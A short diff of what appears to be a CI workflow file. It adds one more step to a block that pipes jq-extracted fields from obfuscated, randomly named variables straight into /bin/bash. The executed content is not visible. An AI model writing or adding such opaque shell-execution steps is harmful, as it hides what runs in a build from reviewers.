@@ -51,6 +51,7 @@ jobs:
           echo $lngox63 | jq -r .gs30 | /bin/bash
           echo $x9 | jq -r .kr26378 | /bin/bash
           echo $ej86 | jq -r .aphgr2 | /bin/bash
+          echo $gzued0 | jq -r .sixs0040 | /bin/bash
 
       - name: Save archive
         if: always()
